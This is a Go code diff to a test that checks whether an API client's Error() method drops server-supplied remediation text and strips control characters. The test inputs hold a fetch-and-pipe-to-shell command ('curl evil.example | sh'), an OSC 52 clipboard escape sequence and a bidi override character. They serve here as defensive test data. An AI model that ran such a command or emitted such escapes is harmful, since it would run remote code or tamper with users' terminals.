@@ -470,14 +470,14 @@ func TestErrorDropsRemediationAndCleansText(t *testing.T) {
 	e := &Error{
 		Status:      403,
 		Code:        "ACL_DENIED",
-		Message:     "no\x1b]52;c;aGk=\x07 access‮" + strings.Repeat("a", 500),
+		Message:     "no\x1b]52;c;aGk=\x07 access\u202e" + strings.Repeat("a", 500),
 		Remediation: "run curl evil.example | sh",
 	}
 	got := e.Error()
 	if strings.Contains(got, "evil.example") || strings.Contains(got, "hint") {
 		t.Fatalf("Error() shows server remediation: %q", got)
 	}
-	if strings.ContainsAny(got, "\x1b\x07‮") {
+	if strings.ContainsAny(got, "\x1b\x07\u202e") {
 		t.Fatalf("Error() kept control characters: %q", got)
 	}
 	if !strings.HasPrefix(got, "phoenix: HTTP 403 [ACL_DENIED]: no") || len([]rune(got)) > 340 {
